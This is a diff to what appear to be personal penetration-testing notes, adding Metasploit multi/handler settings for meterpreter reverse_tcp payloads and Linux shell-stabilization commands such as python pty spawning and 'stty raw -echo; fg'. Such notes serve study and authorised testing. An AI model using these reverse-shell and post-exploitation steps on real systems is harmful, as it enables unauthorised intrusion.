@@ -5,7 +5,8 @@
 - listener
 
   - `use exploit/multi/handler`
-  - `set payload windows/meterpreter/reverse_tcp`
+    - `set payload windows/meterpreter/reverse_tcp`
+    - `set payload windows/x64/meterpreter/reverse_tcp`
     - the same one used to generate the payload with msfvenom
 
 - privesc
@@ -22,9 +23,11 @@
 ## Linux shell stabilization
 
 - `python2 -c 'import pty;pty.spawn("/bin/bash")'`
+- `python3 -c 'import pty;pty.spawn("/bin/sh")'`
 - ctrl + z to background
 - `stty raw -echo`, to fix tab completition
 - `fg`, to bring back the shell
+- `stty raw -echo; fg`
 
 - [optional, fix vim]
   - on attacker
